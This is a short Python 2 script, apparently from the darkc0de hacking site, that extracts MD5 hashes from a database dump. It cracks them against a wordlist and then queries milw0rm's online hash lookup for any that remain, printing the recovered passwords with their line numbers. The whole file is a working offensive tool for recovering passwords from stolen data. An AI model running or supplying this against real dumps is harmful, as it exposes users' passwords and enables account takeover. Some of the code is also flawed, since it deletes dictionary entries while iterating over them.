#!/usr/bin/python
#Collects all md5's from a database dump and
#attempts to crack them with a wordlist and
#milw0rms database. If one is cracked
#it will print out the line it was found on. 

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import md5, sys, re, urllib

def StripTags(text):
    	finished = 0
    	while not finished:
        	finished = 1
        	start = text.find("<")
		if start >= 0:
			stop = text[start:].find(">")
			if stop >= 0:
				text = text[:start] + text[start+stop+1:]
				finished = 0
    	return text

def milw0rm(k):

	site = urllib.urlopen("http://www.milw0rm.com/md5/search.php", urllib.urlencode({"hash": k})).readlines()
	for line in site:
		if re.search(k, line):
			return StripTags(line).replace(k,"").replace("md5","").replace("cracked","").replace("notfound","").replace("waiting","")

if len(sys.argv) != 3:
	print "Usage: ./dumpcrack.py <database> <wordlist>"
	sys.exit(1)

try:
  database = open(sys.argv[1], "r").readlines()
except(IOError): 
  print "\nError: Check your dump path\n"
  sys.exit(1)

try:
  words = open(sys.argv[2], "r").readlines()
except(IOError): 
  print "\nError: Check your wordlist path\n"
  sys.exit(1)

num = 1
md5s = {}
print "\n[+] Words Loaded:",len(words)
print "[+] Searching Database Dump..."
for line in database:
	try:
		MD5 = re.findall("[a-f0-9]"*32,line)[0]
		md5s[MD5] = num
	except(IndexError):
		pass
	num +=1
print "\n[+] MD5s Found:",len(md5s)
print "[+] Beginning Wordlist Crack\n"
for k,v in md5s.items():
	for word in words:
		value = md5.new(word[:-1]).hexdigest()
		if k == value: 
			print "MD5:",k,"Line:",v,"Cracked:",word[:-1],"\n"
			del md5s[k]
print "\n[+] MD5s Left:",len(md5s)
print "[+] Beginning Milworm Crack\n"
for k,v in md5s.items():
	value = milw0rm(k)
	if value != None:
		print "MD5:",k,"Line:",v,"Cracked:",value
		del md5s[k]
print "\n[-] Uncracked:",len(md5s)
print "[-] Done\n"



	
	



